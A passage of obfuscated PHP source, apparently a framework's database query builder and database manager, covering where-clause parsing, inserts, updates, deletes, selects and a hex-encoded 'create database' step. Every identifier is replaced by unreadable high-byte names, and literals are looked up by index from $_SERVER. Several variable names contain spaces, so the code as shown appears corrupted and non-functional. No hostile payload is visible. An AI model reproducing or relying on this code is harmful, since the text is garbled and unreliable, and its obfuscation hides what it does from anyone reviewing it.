$Ã¶íŒìÀ); } return $Ã¶íŒìÀ; } protected function parseValue($Ì¡ñ÷š) { $Î¸ç¹†³ =& $_SERVER[ÓïÕü]; if (is_string($Ì¡ñ÷š)) { $Ì¡ñ÷š = $Î¸ç¹†³[1061] . $this->escapeString($Ì¡ñ÷š) . $Î¸ç¹†³[1061]; } elseif (isset($Ì¡ñ÷š[0]) && is_string($Ì¡ñ÷š[0]) && strtolower($Ì¡ñ÷š[0]) == $Î¸ç¹†³[375]) { $Ì¡ñ÷š = $this->escapeString($Ì¡ñ÷š[1]); } elseif (is_array($Ì¡ñ÷š)) { $Ì¡ñ÷š = array_map(array($this, $Î¸ç¹†³[1062]), $Ì¡ñ÷š); } elseif (is_bool($Ì¡ñ÷š)) { $Ì¡ñ÷š = $Ì¡ñ÷š ? $Î¸ç¹†³[91] : $Î¸ç¹†³[231]; } elseif (is_null($Ì¡ñ÷š)) { $Ì¡ñ÷š = $Î¸ç¹†³[106]; } return $Ì¡ñ÷š; } protected function parseField($èÜ¶ÔÕ) { $ôİÔ‘¦ =& $_SERVER[ÓïÕü]; if (is_string($èÜ¶ÔÕ) && strpos($èÜ¶ÔÕ, $ôİÔ‘¦[50])) { $èÜ¶ÔÕ = explode($ôİÔ‘¦[50], $èÜ¶ÔÕ); } if (is_array($èÜ¶ÔÕ)) { $Ó‰›ÕŠ˜ = array(); foreach ($èÜ¶ÔÕ as $“ş«½ª => $’š„…‘˜) { if (!is_numeric($“ş«½ª)) { $Ó‰›ÕŠ˜[] = $this->parseKey($“ş«½ª, !1) . $ôİÔ‘¦[1102] . $this->parseKey($’š„…‘˜); } else { $Ó‰›ÕŠ˜[] = $this->parseKey($’š„…‘˜); } } $·¼–‹± = implode($ôİÔ‘¦[50], $Ó‰›ÕŠ˜); } elseif (is_string($èÜ¶ÔÕ) && !empty($èÜ¶ÔÕ)) { $·¼–‹± = $èÜ¶ÔÕ; } else { $·¼–‹± = $ôİÔ‘¦[223]; } return $·¼–‹±; } protected function parseTable($åœö¤ì¥) { $ŒÄµŸñ€ =& $_SERVER[ÓïÕü]; if (is_array($åœö¤ì¥)) { $“ÖùŒıó = array(); foreach ($åœö¤ì¥ as $Íı¸ˆ†• => $İŞçö‡) { if (!is_numeric($Íı¸ˆ†•)) { $“ÖùŒıó[] = $this->parseKey($Íı¸ˆ†•) . $ŒÄµŸñ€[53] . $this->parseKey($İŞçö‡); } else { $“ÖùŒıó[] = $this->parseKey($Íı¸ˆ†•); } } $åœö¤ì¥ = $“ÖùŒıó; } elseif (is_string($åœö¤ì¥)) { if (strstr($åœö¤ì¥, $ŒÄµŸñ€[53])) { return $åœö¤ì¥; } $åœö¤ì¥ = explode($ŒÄµŸñ€[50], $åœö¤ì¥); array_walk($åœö¤ì¥, array($this, $ŒÄµŸñ€[1010])); } return $ŒÄµŸñ€[1004] . trim(implode($ŒÄµŸñ€[1103], $åœö¤ì¥), $ŒÄµŸñ€[464]) . $ŒÄµŸñ€[1004]; } protected function parseWhere($Øí ïù) { $úŞõ×„ê =& $_SERVER[ÓïÕü]; $ÓÅòæºå = $úŞõ×„ê[12]; if (is_string($Øí ïù)) { $ÓÅòæºå = $Øí ïù; } else { $ÓÕ“®û = isset($Øí ïù[$úŞõ×„ê[1104]]) ? strtoupper($Øí ïù[$úŞõ×„ê[1104]]) : $úŞõ×„ê[12]; if (in_array($ÓÕ“®û, array($úŞõ×„ê[1105], $úŞõ×„ê[1106], $úŞõ×„ê[1107]))) { $ÓÕ“®û = $úŞõ×„ê[53] . $ÓÕ“®û . $úŞõ×„ê[53]; unset($Øí ïù[$úŞõ×„ê[1104]]); } else { $ÓÕ“®û = $úŞõ×„ê[1108]; } foreach ($Øí ïù as $¹Êâ·‡ => $ÃĞáƒÈÈ) { $ÓÅòæºå .= $úŞõ×„ê[357]; if (is_numeric($¹Êâ·‡)) { $¹Êâ·‡ = $úŞõ×„ê[1109]; } if (0 === strpos($¹Êâ·‡, $úŞõ×„ê[11])) { $ÓÅòæºå .= $this->parseThinkWhere($¹Êâ·‡, $ÃĞáƒÈÈ); } else { if (!preg_match($úŞõ×„ê[1110], trim($¹Êâ·‡))) { think_exception(think_lang($úŞõ×„ê[1111]) . $úŞõ×„ê[4] . $¹Êâ·‡); } $üì¡´«Œ = is_array($ÃĞáƒÈÈ) && isset($ÃĞáƒÈÈ[$úŞõ×„ê[1112]]); $¹Êâ·‡ = trim($¹Êâ·‡); if (strpos($¹Êâ·‡, $úŞõ×„ê[215])) { $Ÿü¸ì·ç = explode($úŞõ×„ê[215], $¹Êâ·‡); $‡«Ñ”‰ = array(); foreach ($Ÿü¸ì·ç as $Î´õ·ñ => $…»ª“ÆÅ) { $ª‰Ä¶î = $üì¡´«Œ ? $ÃĞáƒÈÈ[$Î´õ·ñ] : $ÃĞáƒÈÈ; $‡«Ñ”‰[] = $úŞõ×„ê[340] . $this->parseWhereItem($this->parseKey($…»ª“ÆÅ), $ª‰Ä¶î) . $úŞõ×„ê[1009]; } $ÓÅòæºå .= implode($úŞõ×„ê[1113], $‡«Ñ”‰); } elseif (strpos($¹Êâ·‡, $úŞõ×„ê[287])) { $Ÿü¸ì·ç = explode($úŞõ×„ê[287], $¹Êâ·‡); $‡«Ñ”‰ = array(); foreach ($Ÿü¸ì·ç as $Î´õ·ñ => $…»ª“ÆÅ) { $ª‰Ä¶î = $üì¡´«Œ ? $ÃĞáƒÈÈ[$Î´õ·ñ] : $ÃĞáƒÈÈ; $‡«Ñ”‰[] = $úŞõ×„ê[340] . $this->parseWhereItem($this->parseKey($…»ª“ÆÅ), $ª‰Ä¶î) . $úŞõ×„ê[1009]; } $ÓÅòæºå .= implode($úŞõ×„ê[1108], $‡«Ñ”‰); } else { $ÓÅòæºå .= $this->parseWhereItem($this->parseKey($¹Êâ·‡), $ÃĞáƒÈÈ); } } $ÓÅòæºå .= $úŞõ×„ê[358] . $ÓÕ“®û; } $ÓÅòæºå = substr($ÓÅòæºå, 0, -strlen($ÓÕ“®û)); } return empty($ÓÅòæºå) ? $úŞõ×„ê[12] : $úŞõ×„ê[1114] . $ÓÅòæºå; } protected function parseWhereItem($À­Ô×³, $¿êù§÷¾) { $”ªŒÉ… =& $_SERVER[ÓïÕü]; $ô¢×ò¤ = $”ªŒÉ…[12]; if (is_array($¿êù§÷¾)) { if (is_string($¿êù§÷¾[0])) { $Ôø­¦‘× = strtolower($¿êù§÷¾[0]); if (in_array($¿êù§÷¾[0], array($”ªŒÉ…[509], $”ªŒÉ…[1115], $”ªŒÉ…[1116], $”ªŒÉ…[1117], $”ªŒÉ…[1118], $”ªŒÉ…[1119]))) { $ô¢×ò¤ .= $À­Ô×³ . $”ªŒÉ…[53] . $¿êù§÷¾[0] . $”ªŒÉ…[53] . $this->parseValue($¿êù§÷¾[1]); } elseif (preg_match($”ªŒÉ…[1120], $¿êù§÷¾[0])) { $ô¢×ò¤ .= $À­Ô×³ . $”ªŒÉ…[53] . $this->exp[$Ôø­¦‘×] . $”ªŒÉ…[53] . $this->parseValue($¿êù§÷¾[1]); } elseif (preg_match($”ªŒÉ…[1121], $¿êù§÷¾[0])) { if (is_array($¿êù§÷¾[1])) { $‘‹¹—³ = isset($¿êù§÷¾[2]) ? strtoupper($¿êù§÷¾[2]) : $”ªŒÉ…[1106]; if (in_array($‘‹¹—³, array($”ªŒÉ…[1105], $”ªŒÉ…[1106], $”ªŒÉ…[1107]))) { $¤ÙÂê·ú = array(); foreach ($¿êù§÷¾[1] as $èÜÈ¨À) { $¤ÙÂê·ú[] = $À­Ô×³ . $”ªŒÉ…[53] . $this->exp[$Ôø­¦‘×] . $”ªŒÉ…[53] . $this->parseValue($èÜÈ¨À); } $ô¢×ò¤ .= $”ªŒÉ…[340] . implode($”ªŒÉ…[53] . $‘‹¹—³ . $”ªŒÉ…[53], $¤ÙÂê·ú) . $”ªŒÉ…[1009]; } } else { $ô¢×ò¤ .= $À­Ô×³ . $”ªŒÉ…[53] . $this->exp[$Ôø­¦‘×] . $”ªŒÉ…[53] . $this->parseValue($¿êù§÷¾[1]); } } elseif ($”ªŒÉ…[375] == $Ôø­¦‘×) { $ô¢×ò¤ .= $”ªŒÉ…[1007] . $À­Ô×³ . $”ªŒÉ…[53] . $¿êù§÷¾[1] . $”ªŒÉ…[1122]; } elseif (preg_match($”ªŒÉ…[1123], $¿êù§÷¾[0])) { $ô¢×ò¤ .= $¿êù§÷¾[0]; } elseif (preg_match($”ªŒÉ…[1124], $¿êù§÷¾[0])) { if (isset($¿êù§÷¾[2]) && $”ªŒÉ…[375] == $¿êù§÷¾[2]) { $ô¢×ò¤ .= $À­Ô×³ . $”ªŒÉ…[53] . $this->exp[$Ôø­¦‘×] . $”ªŒÉ…[53] . $¿êù§÷¾[1]; } else { if (is_string($¿êù§÷¾[1])) { $¿êù§÷¾[1] = explode($”ªŒÉ…[50], $¿êù§÷¾[1]); } $¨í„ï÷× = implode($”ªŒÉ…[50], $this->parseValue($¿êù§÷¾[1])); $ô¢×ò¤ .= $À­Ô×³ . $”ªŒÉ…[53] . $this->exp[$Ôø­¦‘×] . $”ªŒÉ…[1007] . $¨í„ï÷× . $”ªŒÉ…[1009]; } } elseif (preg_match($”ªŒÉ…[1125], $¿êù§÷¾[0])) { $¸…©¨³ = is_string($¿êù§÷¾[1]) ? explode($”ªŒÉ…[50], $¿êù§÷¾[1]) : $¿êù§÷¾[1]; $ô¢×ò¤ .= $”ªŒÉ…[1007] . $À­Ô×³ . $”ªŒÉ…[53] . $this->exp[$Ôø­¦‘×] . $”ªŒÉ…[53] . $this->parseValue($¸…©¨³[0]) . $”ªŒÉ…[1108] . $this->parseValue($¸…©¨³[1]) . $”ªŒÉ…[358]; } else { think_exception(think_lang($”ªŒÉ…[1111]) . $”ªŒÉ…[4] . $¿êù§÷¾[0]); } } else { $Ÿ›Å·®Ì = count($¿êù§÷¾); $¤Ô®İò£ = $”ªŒÉ…[12]; if (is_string($¿êù§÷¾[$Ÿ›Å·®Ì - 1])) { $¤Ô®İò£ = isset($¿êù§÷¾[$Ÿ›Å·®Ì - 1]) ? strtoupper($¿êù§÷¾[$Ÿ›Å·®Ì - 1]) : $”ªŒÉ…[12]; if (in_array($¤Ô®İò£, array($”ªŒÉ…[1105], $”ªŒÉ…[1106], $”ªŒÉ…[1107]))) { $Ÿ›Å·®Ì = $Ÿ›Å·®Ì - 1; } } else { $¤Ô®İò£ = $”ªŒÉ…[1105]; } for ($úÉ”„ı = 0; $úÉ”„ı < $Ÿ›Å·®Ì; $úÉ”„ı++) { $¸…©¨³ = is_array($¿êù§÷¾[$úÉ”„ı]) ? $¿êù§÷¾[$úÉ”„ı][1] : $¿êù§÷¾[$úÉ”„ı]; if ($”ªŒÉ…[375] == strtolower($¿êù§÷¾[$úÉ”„ı][0])) { $ô¢×ò¤ .= $”ªŒÉ…[340] . $À­Ô×³ . $”ªŒÉ…[53] . $¸…©¨³ . $”ªŒÉ…[1122] . $¤Ô®İò£ . $”ªŒÉ…[53]; } else { $Ç±†øÁš = is_array($¿êù§÷¾[$úÉ”„ı]) ? $this->exp[strtolower($¿êù§÷¾[$úÉ”„ı][0])] : $”ªŒÉ…[509]; if (!$Ç±†øÁš && is_array($¿êù§÷¾[$úÉ”„ı]) && in_array($¿êù§÷¾[$úÉ”„ı][0], array($”ªŒÉ…[509], $”ªŒÉ…[1115], $”ªŒÉ…[1116], $”ªŒÉ…[1117], $”ªŒÉ…[1118], $”ªŒÉ…[1119]))) { $Ç±†øÁš = $¿êù§÷¾[$úÉ”„ı][0]; } $ô¢×ò¤ .= $”ªŒÉ…[340] . $À­Ô×³ . $”ªŒÉ…[53] . $Ç±†øÁš . $”ªŒÉ…[53] . $this->parseValue($¸…©¨³) . $”ªŒÉ…[1122] . $¤Ô®İò£ . $”ªŒÉ…[53]; } } $ô¢×ò¤ = substr($ô¢×ò¤, 0, -4); } } else { $ô¢×ò¤ .= $À­Ô×³ . $”ªŒÉ…[1126] . $this->parseValue($¿êù§÷¾); } return $ô¢×ò¤; } protected function parseThinkWhere($Îè®§ßù, $Ò­’ãÔ·) { $¯Ğ˜ä¾« =& $_SERVER[ÓïÕü]; $ê¯‰§å¿ = $¯Ğ˜ä¾«[12]; switch ($Îè®§ßù) { case $¯Ğ˜ä¾«[430]: $ê¯‰§å¿ = $Ò­’ãÔ·; break; case $¯Ğ˜ä¾«[1109]: $ê¯‰§å¿ = is_string($Ò­’ãÔ·) ? $Ò­’ãÔ· : substr($this->parseWhere($Ò­’ãÔ·), 6); break; case $¯Ğ˜ä¾«[1127]: parse_str($Ò­’ãÔ·, $ò¼ßÊ™); if (isset($ò¼ßÊ™[$¯Ğ˜ä¾«[1104]])) { $ûïÈŞ¦Ê = $¯Ğ˜ä¾«[53] . strtoupper($ò¼ßÊ™[$¯Ğ˜ä¾«[1104]]) . $¯Ğ˜ä¾«[53]; unset($ò¼ßÊ™[$¯Ğ˜ä¾«[1104]]); } else { $ûïÈŞ¦Ê = $¯Ğ˜ä¾«[1108]; } $ÌÎ ÑµÓ = array(); foreach ($ò¼ßÊ™ as $òÛóï§ => $¢™—…µ) { $ÌÎ ÑµÓ[] = $this->parseKey($òÛóï§) . $¯Ğ˜ä¾«[1126] . $this->parseValue($¢™—…µ); } $ê¯‰§å¿ = implode($ûïÈŞ¦Ê, $ÌÎ ÑµÓ); break; } return $ê¯‰§å¿; } protected function parseLimit($×Ç«ö¯») { $¼¹´›¨º =& $_SERVER[ÓïÕü]; return !empty($×Ç«ö¯») ? $¼¹´›¨º[51] . $×Ç«ö¯» . $¼¹´›¨º[53] : $¼¹´›¨º[12]; } protected function parseJoin($È˜¼„«ì) { $¥·ßàÑò =& $_SERVER[ÓïÕü]; $“Äô¿Ç² = $¥·ßàÑò[12]; if (!empty($È˜¼„«ì)) { if (is_array($È˜¼„«ì)) { foreach ($È˜¼„«ì as $Ñ„å‰Å => $„ƒêò®) { if (!1 !== stripos($„ƒêò®, $¥·ßàÑò[1128])) { $“Äô¿Ç² .= $¥·ßàÑò[53] . $„ƒêò®; } else { $“Äô¿Ç² .= $¥·ßàÑò[1129] . $„ƒêò®; } } } else { $“Äô¿Ç² .= $¥·ßàÑò[1129] . $È˜¼„«ì; } } $“Äô¿Ç² = preg_replace($¥·ßàÑò[1130], think_config($¥·ßàÑò[1034]) . $¥·ßàÑò[1131], $“Äô¿Ç²); return $“Äô¿Ç²; } protected function parseOrder($ÕÍ¦˜³Ô) { $ñƒ„í‹ =& $_SERVER[ÓïÕü]; if (is_array($ÕÍ¦˜³Ô)) { $½ÄŠÛÉ¹ = array(); foreach ($ÕÍ¦˜³Ô as $Óöâ‘Î => $Æı¤í˜û) { if (is_numeric($Óöâ‘Î)) { $½ÄŠÛÉ¹[] = $this->parseKey($Æı¤í˜û); } else { $Æı¤í˜û = in_array(strtoupper(trim($Æı¤í˜û)), array($ñƒ„í‹[1132], $ñƒ„í‹[1133])) ? $ñƒ„í‹[53] . $Æı¤í˜û : $ñƒ„í‹[12]; if (preg_match($ñƒ„í‹[1134], $Óöâ‘Î)) { $½ÄŠÛÉ¹[] = $this->parseKey($Óöâ‘Î) . $Æı¤í˜û; } else { think_exception($ñƒ„í‹[1135] . $Óöâ‘Î); } } } $ÕÍ¦˜³Ô = implode($ñƒ„í‹[50], $½ÄŠÛÉ¹); } return !empty($ÕÍ¦˜³Ô) ? $ñƒ„í‹[1136] . $ÕÍ¦˜³Ô : $ñƒ„í‹[12]; } protected function parseGroup($Õ™ùÀ¨²) { $€®ÛË‰¸ =& $_SERVER[ÓïÕü]; return !empty($Õ™ùÀ¨²) ? $€®ÛË‰¸[1137] . $Õ™ùÀ¨² : $€®ÛË‰¸[12]; } protected function parseHaving($ŸåŠ¹¤Í) { $³ìó°—² =& $_SERVER[ÓïÕü]; return !empty($ŸåŠ¹¤Í) ? $³ìó°—²[1138] . $ŸåŠ¹¤Í : $³ìó°—²[12]; } protected function parseComment($ÆşØØÈÙ) { $»‰Õ‚®Â =& $_SERVER[ÓïÕü]; return !empty($ÆşØØÈÙ) ? $»‰Õ‚®Â[1139] . $ÆşØØÈÙ . $»‰Õ‚®Â[1140] : $»‰Õ‚®Â[12]; } protected function parseDistinct($öŒ¤±Ã) { $óÀœ¯Ãµ =& $_SERVER[ÓïÕü]; return !empty($öŒ¤±Ã) ? $óÀœ¯Ãµ[1141] : $óÀœ¯Ãµ[12]; } protected function parseUnion($¼‘¬Û©ç) { $““úº«Ç =& $_SERVER[ÓïÕü]; if (empty($¼‘¬Û©ç)) { return $““úº«Ç[12]; } if (isset($¼‘¬Û©ç[$““úº«Ç[426]])) { $¿ò½š–¯ = $““úº«Ç[1142]; unset($¼‘¬Û©ç[$““úº«Ç[426]]); } else { $¿ò½š–¯ = $““úº«Ç[1143]; } foreach ($¼‘¬Û©ç as $óË±»Ã…) { $¯¨Şîí[] = $¿ò½š–¯ . (is_array($óË±»Ã…) ? $this->buildSelectSql($óË±»Ã…) : $óË±»Ã…); } return implode($““úº«Ç[53], $¯¨Şîí); } public function insert($øÙ“Ñ¶, $³·’ÃÃ = array(), $¬¯¥Ú • = false) { $´ÃÛ ıù =& $_SERVER[ÓïÕü]; $¥å†÷Ëš = $İèæ¼ = array(); $this->model = $³·’ÃÃ[$´ÃÛ ıù[361]]; foreach ($øÙ“Ñ¶ as $Ã¼¢¾¶Ô => $ºœùÄ¿¤) { if (is_array($ºœùÄ¿¤) && $´ÃÛ ıù[375] == $ºœùÄ¿¤[0]) { $İèæ¼[] = $this->parseKey($Ã¼¢¾¶Ô); $¥å†÷Ëš[] = $ºœùÄ¿¤[1]; } elseif (is_scalar($ºœùÄ¿¤) || is_null($ºœùÄ¿¤)) { $İèæ¼[] = $this->parseKey($Ã¼¢¾¶Ô); $¥å†÷Ëš[] = $this->parseValue($ºœùÄ¿¤); } } $¥¥Ø¢Ÿ = ($¬¯¥Ú • ? $´ÃÛ ıù[1011] : $´ÃÛ ıù[1012]) . $´ÃÛ ıù[1013] . $this->parseTable($³·’ÃÃ[$´ÃÛ ıù[359]]) . $´ÃÛ ıù[1007] . implode($´ÃÛ ıù[50], $İèæ¼) . $´ÃÛ ıù[1008] . implode($´ÃÛ ıù[50], $¥å†÷Ëš) . $´ÃÛ ıù[1009]; $¥¥Ø¢Ÿ .= $this->parseLock(isset($³·’ÃÃ[$´ÃÛ ıù[948]]) ? $³·’ÃÃ[$´ÃÛ ıù[948]] : !1); $¥¥Ø¢Ÿ .= $this->parseComment(!empty($³·’ÃÃ[$´ÃÛ ıù[432]]) ? $³·’ÃÃ[$´ÃÛ ıù[432]] : $´ÃÛ ıù[12]); return $this->execute($¥¥Ø¢Ÿ, $this->parseBind(!empty($³·’ÃÃ[$´ÃÛ ıù[363]]) ? $³·’ÃÃ[$´ÃÛ ıù[363]] : array())); } public function selectInsert($ü§¶›©†, $·«Îœ·ì, $ÙÌë«œĞ = array()) { $šÜ‡Õ‡À =& $_SERVER[ÓïÕü]; $this->model = $ÙÌë«œĞ[$šÜ‡Õ‡À[361]]; if (is_string($ü§¶›©†)) { $ü§¶›©† = explode($šÜ‡Õ‡À[50], $ü§¶›©†); } array_walk($ü§¶›©†, array($this, $šÜ‡Õ‡À[1010])); $ü“ûƒ†‰ = $šÜ‡Õ‡À[1144] . $this->parseTable($·«Îœ·ì) . $šÜ‡Õ‡À[1007] . implode($šÜ‡Õ‡À[50], $ü§¶›©†) . $šÜ‡Õ‡À[1122]; $ü“ûƒ†‰ .= $this->buildSelectSql($ÙÌë«œĞ); return $this->execute($ü“ûƒ†‰, $this->parseBind(!empty($ÙÌë«œĞ[$šÜ‡Õ‡À[363]]) ? $ÙÌë«œĞ[$šÜ‡Õ‡À[363]] : array())); } public function update($åÜ¿„½‰, $ı®Í«ß) { $ùüÂ•ù =& $_SERVER[ÓïÕü]; $this->model = $ı®Í«ß[$ùüÂ•ù[361]]; $ñÃ­ëîÛ = $ùüÂ•ù[1145] . $this->parseTable($ı®Í«ß[$ùüÂ•ù[359]]) . $this->parseSet($åÜ¿„½‰) . $this->parseWhere(!empty($ı®Í«ß[$ùüÂ•ù[355]]) ? $ı®Í«ß[$ùüÂ•ù[355]] : $ùüÂ•ù[12]) . $this->parseOrder(!empty($ı®Í«ß[$ùüÂ•ù[444]]) ? $ı®Í«ß[$ùüÂ•ù[444]] : $ùüÂ•ù[12]) . $this->parseLimit(!empty($ı®Í«ß[$ùüÂ•ù[370]]) ? $ı®Í«ß[$ùüÂ•ù[370]] : $ùüÂ•ù[12]) . $this->parseLock(isset($ı®Í«ß[$ùüÂ•ù[948]]) ? $ı®Í«ß[$ùüÂ•ù[948]] : !1) . $this->parseComment(!empty($ı®Í«ß[$ùüÂ•ù[432]]) ? $ı®Í«ß[$ùüÂ•ù[432]] : $ùüÂ•ù[12]); return $this->execute($ñÃ­ëîÛ, $this->parseBind(!empty($ı®Í«ß[$ùüÂ•ù[363]]) ? $ı®Í«ß[$ùüÂ•ù[363]] : array())); } public function delete($öÖœúı˜ = array()) { $ô‡ÑˆëÍ =& $_SERVER[ÓïÕü]; $this->model = $öÖœúı˜[$ô‡ÑˆëÍ[361]]; $÷ÃÜ¹á = $ô‡ÑˆëÍ[1146] . $this->parseTable($öÖœúı˜[$ô‡ÑˆëÍ[359]]) . $this->parseWhere(!empty($öÖœúı˜[$ô‡ÑˆëÍ[355]]) ? $öÖœúı˜[$ô‡ÑˆëÍ[355]] : $ô‡ÑˆëÍ[12]) . $this->parseOrder(!empty($öÖœúı˜[$ô‡ÑˆëÍ[444]]) ? $öÖœúı˜[$ô‡ÑˆëÍ[444]] : $ô‡ÑˆëÍ[12]) . $this->parseLimit(!empty($öÖœúı˜[$ô‡ÑˆëÍ[370]]) ? $öÖœúı˜[$ô‡ÑˆëÍ[370]] : $ô‡ÑˆëÍ[12]) . $this->parseLock(isset($öÖœúı˜[$ô‡ÑˆëÍ[948]]) ? $öÖœúı˜[$ô‡ÑˆëÍ[948]] : !1) . $this->parseComment(!empty($öÖœúı˜[$ô‡ÑˆëÍ[432]]) ? $öÖœúı˜[$ô‡ÑˆëÍ[432]] : $ô‡ÑˆëÍ[12]); return $this->execute($÷ÃÜ¹á, $this->parseBind(!empty($öÖœúı˜[$ô‡ÑˆëÍ[363]]) ? $öÖœúı˜[$ô‡ÑˆëÍ[363]] : array())); } public function select($¡ªË‰…¦ = array()) { $Ğ¯ÇıâÄ =& $_SERVER[ÓïÕü]; $this->model = $¡ªË‰…¦[$Ğ¯ÇıâÄ[361]]; $–›×®¼ = $this->buildSelectSql($¡ªË‰…¦); $¨‚÷îëË = isset($¡ªË‰…¦[$Ğ¯ÇıâÄ[427]]) ? $¡ªË‰…¦[$Ğ¯ÇıâÄ[427]] : !1; if ($¨‚÷îëË) { $ö¬¡„õ = is_string($¨‚÷îëË[$Ğ¯ÇıâÄ[97]]) ? $¨‚÷îëË[$Ğ¯ÇıâÄ[97]] : $Ğ¯ÇıâÄ[1147] . md5($–›×®¼); $Î„ş‰¥¥ = think_cache($ö¬¡„õ, $Ğ¯ÇıâÄ[12], $¨‚÷îëË); if (!1 !== $Î„ş‰¥¥) { return $Î„ş‰¥¥; } } $õôË‡ğò = $this->query($–›×®¼, $this->parseBind(!empty($¡ªË‰…¦[$Ğ¯ÇıâÄ[363]]) ? $¡ªË‰…¦[$Ğ¯ÇıâÄ[363]] : array())); if ($¨‚÷îëË && !1 !== $õôË‡ğò) { think_cache($ö¬¡„õ, $õôË‡ğò, $¨‚÷îëË); } return $õôË‡ğò; } public function buildSelectSql($ìÎë¸ëê = array()) { $ŠÊ¾ÉÏÃ =& $_SERVER[ÓïÕü]; if (isset($ìÎë¸ëê[$ŠÊ¾ÉÏÃ[431]])) { if (strpos($ìÎë¸ëê[$ŠÊ¾ÉÏÃ[431]], $ŠÊ¾ÉÏÃ[50])) { list($³¿‰îÒû, $Éå ÷ì¥) = explode($ŠÊ¾ÉÏÃ[50], $ìÎë¸ëê[$ŠÊ¾ÉÏÃ[431]]); } else { $³¿‰îÒû = $ìÎë¸ëê[$ŠÊ¾ÉÏÃ[431]]; } $³¿‰îÒû = $³¿‰îÒû ? $³¿‰îÒû : 1; $Éå ÷ì¥ = isset($Éå ÷ì¥) ? $Éå ÷ì¥ : (is_numeric($ìÎë¸ëê[$ŠÊ¾ÉÏÃ[370]]) ? $ìÎë¸ëê[$ŠÊ¾ÉÏÃ[370]] : 20); $ÊæÂÑä = $Éå ÷ì¥ * ((int) $³¿‰îÒû - 1); $ìÎë¸ëê[$ŠÊ¾ÉÏÃ[370]] = $ÊæÂÑä . $ŠÊ¾ÉÏÃ[50] . $Éå ÷ì¥; } if (think_config($ŠÊ¾ÉÏÃ[1148])) { $ÂµÈº»« = $ŠÊ¾ÉÏÃ[1149] . md5(serialize($ìÎë¸ëê)); $¼“û—áİ = think_cache($ÂµÈº»«); if ($¼“û—áİ) { return $¼“û—áİ; } } $—ö’·›ã = $this->parseSql($this->selectSql, $ìÎë¸ëê); $—ö’·›ã .= $this->parseLock(isset($ìÎë¸ëê[$ŠÊ¾ÉÏÃ[948]]) ? $ìÎë¸ëê[$ŠÊ¾ÉÏÃ[948]] : !1); if (isset($ÂµÈº»«)) { think_cache($ÂµÈº»«, $—ö’·›ã); } return $—ö’·›ã; } public function parseSql($şóªù©ı, $ÊËÄéãš = array()) { $¥±¯¹óÕ =& $_SERVER[ÓïÕü]; $şóªù©ı = str_replace(array($¥±¯¹óÕ[1150], $¥±¯¹óÕ[1151], $¥±¯¹óÕ[1152], $¥±¯¹óÕ[1153], $¥±¯¹óÕ[1154], $¥±¯¹óÕ[1155], $¥±¯¹óÕ[1156], $¥±¯¹óÕ[1157], $¥±¯¹óÕ[1158], $¥±¯¹óÕ[1159], $¥±¯¹óÕ[1160]), array($this->parseTable("{$ÊËÄéãš[$¥±¯¹óÕ[359]]}"), $this->parseDistinct(isset($ÊËÄéãš[$¥±¯¹óÕ[1161]]) ? $ÊËÄéãš[$¥±¯¹óÕ[1161]] : !1), $this->parseField(!empty($ÊËÄéãš[$¥±¯¹óÕ[353]]) ? $ÊËÄéãš[$¥±¯¹óÕ[353]] : $¥±¯¹óÕ[223]), $this->parseJoin(!empty($ÊËÄéãš[$¥±¯¹óÕ[362]]) ? $ÊËÄéãš[$¥±¯¹óÕ[362]] : $¥±¯¹óÕ[12]), $this->parseWhere(!empty($ÊËÄéãš[$¥±¯¹óÕ[355]]) ? $ÊËÄéãš[$¥±¯¹óÕ[355]] : $¥±¯¹óÕ[12]), $this->parseGroup(!empty($ÊËÄéãš[$¥±¯¹óÕ[583]]) ? $ÊËÄéãš[$¥±¯¹óÕ[583]] : $¥±¯¹óÕ[12]), $this->parseHaving(!empty($ÊËÄéãš[$¥±¯¹óÕ[1162]]) ? $ÊËÄéãš[$¥±¯¹óÕ[1162]] : $¥±¯¹óÕ[12]), $this->parseOrder(!empty($ÊËÄéãš[$¥±¯¹óÕ[444]]) ? $ÊËÄéãš[$¥±¯¹óÕ[444]] : $¥±¯¹óÕ[12]), $this->parseLimit(!empty($ÊËÄéãš[$¥±¯¹óÕ[370]]) ? $ÊËÄéãš[$¥±¯¹óÕ[370]] : $¥±¯¹óÕ[12]), $this->parseUnion(!empty($ÊËÄéãš[$¥±¯¹óÕ[425]]) ? $ÊËÄéãš[$¥±¯¹óÕ[425]] : $¥±¯¹óÕ[12]), $this->parseComment(!empty($ÊËÄéãš[$¥±¯¹óÕ[432]]) ? $ÊËÄéãš[$¥±¯¹óÕ[432]] : $¥±¯¹óÕ[12])), $şóªù©ı); return $şóªù©ı; } public function getLastSql($Óá× ış = '') { return $Óá× ış ? $this->modelSql[$Óá× ış] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($“ø •Áø) { return addslashes($“ø •Áø); } public function setModel($úëæ‹²) { $this->model = $úëæ‹²; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($‚­Š¹² = array()) { $Õ³×²Ÿˆ =& $_SERVER[ÓïÕü]; if (empty($‚­Š¹²)) { $‚­Š¹² = $GLOBALS[$Õ³×²Ÿˆ[6]][$Õ³×²Ÿˆ[21]]; } $this->database = $‚­Š¹²; } public function model($æ²›Ö’î = '') { return new ModelBase($æ²›Ö’î, $_SERVER[ÓïÕü][12], $this->database); } public function db($ú³ÑÁŠü = false) { $æÈ£¾óã =& $_SERVER[ÓïÕü]; $„Éƒ­œ = array_change_key_case($this->database); if ($this->dbType() == $æÈ£¾óã[13] || !$ú³ÑÁŠü) { return $this->model()->db(); } $ÜÅ¿ì€ò = $„Éƒ­œ[$æÈ£¾óã[1076]]; $„Éƒ­œ[$æÈ£¾óã[1076]] = $æÈ£¾óã[12]; if ($„Éƒ­œ[$æÈ£¾óã[1071]] == $æÈ£¾óã[1068]) { $—½Íîûø = $„Éƒ­œ[$æÈ£¾óã[1077]]; $„Éƒ­œ[$æÈ£¾óã[1077]] = substr($—½Íîûø, 0, strrpos($—½Íîûø, $æÈ£¾óã[1163])); } $this->database = $„Éƒ­œ; $·€é›²ˆ = $this->model()->db(); try { $…ÔÃì™Ò = $·€é›²ˆ->execute("\163\x68\157\x77\40\x64\141\164\x61\142\x61\163\145\x73\40\154\x69\153\145\x20\x27{$ÜÅ¿ì€ò}\x27"); } catch (Exception $ã‰óŞå¼) { } if (!$…ÔÃì™Ò) { $·€é›²ˆ->execute("\x63\x72\145\x61\x74\145\x20\144\x61\x74\x61\x62\x61\x73\145\x20\140{$ÜÅ¿ì€ò}\x60"); } $„Éƒ­œ[$æÈ£¾óã[1076]] = $ÜÅ¿ì€ò; if 